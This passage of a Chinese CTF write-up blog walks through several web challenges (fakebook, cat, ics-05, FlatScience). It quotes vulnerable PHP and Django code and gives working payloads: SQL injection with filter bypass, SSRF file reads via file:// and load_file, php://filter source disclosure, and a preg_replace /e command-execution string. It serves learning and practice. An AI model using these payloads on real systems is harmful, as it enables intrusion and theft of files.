class="keyword">print</span>(base64_encode(<span class="variable">$se</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></code></pre><p>GET传递base64编码结果，得到flag<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569811.png" alt="1602427435111.png"></p><p>也可以在线编码，但是注意需要在Demo左右添加\00，因为私有属性private在序列化时会自动添加类名及\00不可打印符号，但是查看源码是可以发现的：<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569824.png" alt="1602430789230.png"></p><p>所以在手动修改数据并base64时，需要添加\00<br><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/10/13/1602569832.png" alt="1602430889005.png"></p><h2 id="⭐-fakebook（SSRF-SQL注入）"><a href="#⭐-fakebook（SSRF-SQL注入）" class="headerlink" title="⭐ fakebook（SSRF+SQL注入）"></a>⭐ fakebook（SSRF+SQL注入）</h2><p>4星难度的题目，从这道题开始明显感觉到有些吃力，能做出来得益于师傅们的wp文章。</p><p>首先扫描网站目录，发现存在flag.php文件，在robots.txt中发现了user.php.bak文件，访问该文件保存至本地，是php源码，进行代码审计：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        curl_setopt(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = curl_getinfo(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过审计发现，在get函数中，第23行没有对传入的url，也就是用户指定的自己的Blog地址做安全校验，导致此处可能<strong>存在SSRF漏洞</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$output</span> = curl_exec(<span class="variable">$ch</span>);</span><br></pre></td></tr></table></figure><p>然后在isValidBlog函数中，第41行对blog做了正则匹配，必须输入网址格式</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br></pre></td></tr></table></figure><p>已知可能存在SSRF，又有**isValidBlog()**函数过滤，但是不知道是在输入的时候过滤还是查询的时候同样过滤，如果是只在输入的时候过滤，那么只需要想办法将SSRF利用代码传入数据库，查询即可；如果是查询前过滤，那就得另寻他法了。</p><p>继续往下，在注册用户和查询用户信息参数处都存在SQL时间盲注，而且页面报错也爆出了网站根目录<code>/var/www/html/</code>直接SQLmap跑表</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386702.png" alt="1604157974568.png"></p><p>跑fakebook库的内容，发现存储的是注册用户的个人信息序列化结果</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386709.png" alt="1604158158876.png"></p><p>尝试利用SQLmap执行系统命令失败了，这就有另外一个可能的利用方式了，已知信息如下：</p><ul><li>存在SSRF，可能仅在注册时检查Blog URL的合法性</li><li>存在SQL注入</li><li>已知网站根目录和flag.php位置</li><li>数据库存储的是个人信息的序列化结果</li></ul><p>利用这些，可以尝试在查询用户数据信息时，将用户的Blog URL改为file协议读取<strong>flag.php</strong>文件的SSRF利用代码，构造序列化结果并通过SQL注入来完成查询，即可得到Flag（当然这也是读师傅们文章得到的启发~）</p><p>通过对参数n的SQL注入测试，得到有4个字段，用户blog数据在第四个字段，而且程序对<code>union select</code>有过滤，可以使用注释<code>/**/</code>替换空格的方式绕过</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?no&#x3D;0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39;</span><br></pre></td></tr></table></figure><p>成功执行</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386731.png" alt="1604161297056.png"></p><p>查看页面源码已经读出flag.php文件内容，只不过做了base64编码后放在了iframe标签中</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386745.png" alt="1604161517371.png"></p><p>对这串base64解码同样是就是flag.php文件的内容</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386755.png" alt="1604161465705.png"></p><p>看了师傅们的wp，得知还有另一种更为简单的，但其实道理是一样的，都是利用SQL注入，读取/var/www/html/flag.php文件，只不过此方法是将数据回显放在了其他字段，比如姓名西段，就不需要做序列化了</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x2F;**&#x2F;union&#x2F;**&#x2F;select 1,load_file(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&#39;),3,4</span><br></pre></td></tr></table></figure><p>执行后查看源码即可得到Flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604386764.png" alt="1604162503775.png"></p><h3 id="总结一下"><a href="#总结一下" class="headerlink" title="总结一下"></a><strong>总结一下</strong></h3><p>漏洞点：SSRF、SQL注入、报错信息泄露根目录，Web扫描得到关键路径</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h3><p><a href="https://blog.csdn.net/qq_42196196/article/details/81952174">https://blog.csdn.net/qq_42196196/article/details/81952174</a></p><p><a href="http://www.mamicode.com/info-detail-2893815.html">http://www.mamicode.com/info-detail-2893815.html</a></p><h2 id="⭐-cat（Django宽字节报错-php-curl-读取文件）"><a href="#⭐-cat（Django宽字节报错-php-curl-读取文件）" class="headerlink" title="⭐ cat（Django宽字节报错+php curl @读取文件）"></a>⭐ cat（Django宽字节报错+php curl @读取文件）</h2><p>很难，几乎完全参考师傅们的wp做完的，大佬的思路真的野！😅</p><p>一个ping功能的系统，尝试管道符命令执行发现被过滤，FUZZ测试，发现url过滤处的没有对以下特殊字符进行过滤：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387393.png" alt="1604207185171.png"></p><p>测试发现后台使用的是GBK宽字符编码，可以通过修改url参数值为宽字符**%df**制造报错，发现后端是用Python的Django框架写的</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387401.png" alt="1604204281681 (1).png"></p><p>而且找到了ping函数的内容：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387409.png" alt="1604204491772 (1).png"></p><p>把代码拷到本地，整理一下，其实也很简单的逻辑，甚至不需要拷到本地</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@process_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ping</span>(<span class="params">request</span>):</span></span><br><span class="line"><span class="comment"># 转义</span></span><br><span class="line">data = request.POST.get(<span class="string">&#x27;url&#x27;</span>)</span><br><span class="line">data = escape(data)</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">&#x27;^[a-zA-Z0-9\-\./]+$&#x27;</span>, data):</span><br><span class="line"><span class="keyword">return</span> HttpResponse(<span class="string">&quot;Invalid URL&quot;</span>)</span><br><span class="line"><span class="keyword">return</span> HttpResponse(os.popen(<span class="string">&quot;ping -c 1 \&quot;%s\&quot;&quot;</span> % data).read())</span><br></pre></td></tr></table></figure><p>首先<code>escape()</code>函数对输入中的特殊字符进行转义，然后将转义结果放在<code>re.match()</code>中进行匹配过滤，匹配网址或ip的数据格式，最后使用<code>os.popen()</code>执行ping命令，得到并返回结果。</p><p>根据师傅们的文章得知，原题目在比赛中是有提示的（ <code>RTFM of PHP CURL===&gt;&gt;read the fuck manul of PHP CURL???</code> ），所以此处需要利用PHP curl中的@来读取文件，查找PHP手册得到了一些信息：<a href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p><blockquote><p>There are “@” issue on multipart POST requests.</p><p>Solution for PHP 5.5 or later:</p><ul><li>Enable CURLOPT_SAFE_UPLOAD.</li><li>Use CURLFile instead of “@”.</li></ul><p>Solution for PHP 5.4 or earlier:</p><ul><li>Build up multipart content body by youself.</li><li>Change “Content-Type” header by yourself.</li></ul></blockquote><p>手册总的大致意思是在php5.5之后就废弃了POST请求中<code>@+文件路径</code>的上传文件方法。在外网找到了一个相关使用示例：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387427.png" alt="1604209282439(1).png"></p><p>利用此前的页面报错得到的Django项目路径，以及在报错页面搜索得到的database.sqlite3数据库文件，尝试读取该数据库文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@&#x2F;opt&#x2F;api&#x2F;database.sqlite3</span><br></pre></td></tr></table></figure><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387435.png" alt="1604214520408 (1).png"></p><p>页面搜索CTF，得到Flag：<code>AWHCTF&#123;yoooo_Such_A_G00D_@&#125;</code></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>解释一下为什么此处能够读取到文件，正常程序POST请求和FILE请求是分开的，但是题目中将FILE请求和POST请求合并到了一块：</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387447.png" alt="1604216002158.png"></p><p>同时又将<strong>CONTENT_TYPE</strong>设定为奇怪的<code>multipart/form-data</code></p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604387456.png" alt="1604216203986.png"></p><p>而PHP的curl中@上传文件正好是在需要 <code>multipart/form-data</code> 所以猜测后台的<strong>程序逻辑</strong>是：</p><ul><li>PHP接收GET参数，使用POST方式传递给后台Django搭建的api</li><li>Django对PHP传进来的POST数据做GBK编码</li><li>GBK编码后再执行Django中的ping操作</li></ul><p>所以能够利用并<strong>读取文件的原理</strong>是：</p><ul><li>利用PHP的curl @读取文件后，POST传递给Django做编码处理</li><li>Django中GBK编码无法对POST传递的文件内容中超过%7F的字符做编解码处理就会报错，比如<code>\xe6</code></li><li>Django开启了debug，所以会将POST数据作为报错输出到页面</li></ul><p>也是参考师傅们学习的，路子太野了~</p><h3 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.wupco.cn/?p=4195">http://www.wupco.cn/?p=4195</a></p><p><a href="https://www.php.net/manual/zh/function.curl-setopt.php">https://www.php.net/manual/zh/function.curl-setopt.php</a></p><p><a href="https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/">https://www.dazhuanlan.com/2019/12/30/5e0957fc025dc/</a></p><p><a href="https://www.php.net/manual/zh/class.curlfile.php">https://www.php.net/manual/zh/class.curlfile.php</a></p><p><a href="https://www.cnblogs.com/Jleixin/p/13024972.html">https://www.cnblogs.com/Jleixin/p/13024972.html</a></p><p><a href="http://code.iamkate.com/php/sending-files-using-curl/">http://code.iamkate.com/php/sending-files-using-curl/</a></p><h2 id="⭐-ics-05（文件包含-php-filter本地读取-preg-replace-命令执行）"><a href="#⭐-ics-05（文件包含-php-filter本地读取-preg-replace-命令执行）" class="headerlink" title="⭐ ics-05（文件包含+php://filter本地读取+preg_replace()命令执行）"></a>⭐ ics-05（文件包含+php://filter本地读取+preg_replace()命令执行）</h2><p>题目描述： 其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统，所以直接进习通的维护中心板块，但是发现页面是接口请求异常</p><p>点击做上边的标题，发现url中page参数包含了index页面，考虑是否存在文件包含漏洞</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393476.png" alt="1604245119902 (1).png"></p><p>将page参数改为<code>/etc/passwd</code>成功包含，的确存在，但是尝试其他文件又没有反应，而且当输入的是字符串时，会直接输出该字符串，不太理解……</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393505.png" alt="1604245312186 (1).png"></p><p>FUZZ跑一下特殊字符，发现所有字符都会被过滤，唯独<code>#</code>不会过滤，且会作为截断符号</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393520.png" alt="1604245457548(1).png"></p><p>所以考虑能不能SQL注入，但是尝试了很久都没有结果，实在没办法，看了师傅们的wp得知，此处需要<strong>利用文件包含，通过php伪协议<code>php://filter</code>来读取文件</strong>。</p><p>OK，既然知道了利用手段，开始学习呗。</p><p>官方解释<code>php://filter</code>是 一种原封装器，设计用于数据流打开时的筛选过滤应用。，其实就是对数据流进行过滤，以当前题目的payload来实例分析：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>这里边：</p><ul><li><strong>php:</strong> 代表一种php协议；</li><li>**php://filter/ **表示用于访问本地文件；</li><li><strong>read=convert.base64-encode</strong> 代表读取的是base64编码后的结果；</li><li>**/resource=index.php **表示要读取的目标文件是index.php。</li></ul><p>当然还可以写文件，具体见以下链接及官方手册：</p><p><a href="https://www.php.net/manual/zh/wrappers.php.php"><strong>https://www.php.net/manual/zh/wrappers.php.php</strong></a></p><p><a href="https://www.cnblogs.com/linuxsec/articles/12684259.html"><strong>https://www.cnblogs.com/linuxsec/articles/12684259.html</strong></a></p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393571.png" alt="1604246054845 (1).png"></p><p>所以payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</span><br></pre></td></tr></table></figure><p>读取index.php的base64编码后的内容，并输出在页面</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393584.png" alt="1604246697723 (1).png"></p><p>base64解码后，得到index.php的源码，主要的部分有以下3个片段</p><p><strong>1</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$page</span> = <span class="variable">$_GET</span>[page];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> (ctype_alnum(<span class="variable">$page</span>)) &#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line">    &lt;div style=<span class="string">&quot;text-align:center&quot;</span>&gt;</span><br><span class="line">        &lt;p class=&quot;lead&quot;&gt;&lt;?php echo $page; die();?&gt;&lt;/p&gt;</span><br><span class="line">    &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段主要在第9行，解释了为什么会返回字符串</p><p><strong>2</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;input&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;ta:text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$page</span>, <span class="string">&#x27;text&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$page</span> === <span class="string">&#x27;index.php&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Ok&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$page</span>);</span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这段对包含的文件名做了过滤，并对包含index.php的返回值做了重写，所以无法包含直接得到index.php源码，然后如果没有被甄别到的话，机会执行14行的包含文件操作，没有其他的安全校验了</p><p><strong>3</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>] === <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$pattern</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$replacement</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一段是最关键的，源码显示，如果<code>X_FORWARDED_FOR</code>是127.0.0.1的话，就会触发下面的代码逻辑，接受3个参数进行<code>preg_replace()</code>函数的正则替换，但是并没有对这三个参数做安全校验。</p><p>在之前的漏洞复现 <a href="https://www.yyxzz.net/articles/59.html"><strong>CVE-2016-5734 - phpmyadmin远程代码执行</strong></a> 中学习到，<code>preg_replace()</code>函数当正则表达式的模式是<code>/e</code>时，会进行命令执行，具体可看之前的漏洞复现文章中的分析。所以我们只需要将<code>X_FORWARDED_FOR</code>设定为127.0.0.1，然后构造payload执行命令读取flag即可。</p><p>使用ModHeader插件添加请求头，访问index.php页面即可触发内部测试页面</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393603.png" alt="1604247980550 (1).png"></p><p>构造如下payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pat=/(.)/e&amp;rep=system(<span class="string">&#x27;cat s3chahahaDir/flag/flag.php&#x27;</span>)&amp;sub=aaa</span><br></pre></td></tr></table></figure><p>flag的路径是不断<code>ls -l</code>出来的，发送即可包含该文件得到Flag</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604393621.png" alt="1604248139499.png"></p><h3 id="参考-2"><a href="#参考-2" class="headerlink" title="参考"></a>参考</h3><p><a href="https://www.php.net/manual/zh/wrappers.php.php">https://www.php.net/manual/zh/wrappers.php.php</a></p><p><a href="https://www.cnblogs.com/linuxsec/articles/12684259.html">https://www.cnblogs.com/linuxsec/articles/12684259.html</a></p><p><a href="https://blog.csdn.net/destiny1507/article/details/82347371">https://blog.csdn.net/destiny1507/article/details/82347371</a></p><h2 id="⭐-FlatScience（SQLite回显注入-python脚本密码碰撞）"><a href="#⭐-FlatScience（SQLite回显注入-python脚本密码碰撞）" class="headerlink" title="⭐ FlatScience（SQLite回显注入+python脚本密码碰撞）"></a>⭐ FlatScience（SQLite回显注入+python脚本密码碰撞）</h2><p>题目来源：Hack.lu-2017</p><p>页面是一些链接，点进去全是pdf文件，有多层目录嵌套，没有发现可疑点</p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395488.png" alt="1604305384872.png"></p><p>Dirb扫描发现了robots.txt文件，得到两个路径：login.php和admin.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: &#x2F;login.php</span><br><span class="line">Disallow: &#x2F;admin.php</span><br></pre></td></tr></table></figure><p>admin.php提示需要admin账户登录，尝试SQL注入和登录绕过都失败了，原码处注释<code>&lt;!-- do not even try to bypass this --&gt;</code>，看来行不通，暂时放下</p><p>在login.php中的usr参数发现了SQL注入漏洞，使用单引号制造报错，得到数据库类型SQLite以及网站根目录<code>/var/www/html</code></p><p><img src="https://typecho-1302945528.cos.ap-chengdu.myqcloud.com/2020/11/03/1604395499.png" alt="1604305624026.png"></p><p>而且在本页面的源码处也发现了注释提示：<code>&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</code>，意思是要**?debug<strong>吗，url后输入</strong>?debug**果然页面给出了login.php源码，截取部分关键的php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;usr&#x27;</span>];</span><br><span class="line">        <span class="variable">$pass</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pw&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$db</span> = <span class="keyword">new</span> SQLite3(<span class="string">&#x27;../fancy.db&#x27;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&quot;SELECT id,name from Users where name=&#x27;&quot;</span>.<span class="variable">$user</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.sha1(<span class="variable">$pass</span>.<span class="string">&quot;Salz!&quot;</span>).<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$row</span> = <span class="variable">$res</span>-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Some Error occourred!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27; &#x27;</span>.<span class="variable">$row</span>[<span class="string">&#x27;name&#x27;</span>], time() + <span class="number">60</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">            header(<span class="string">&quot;Location: /&quot;</span>);</span><br><span 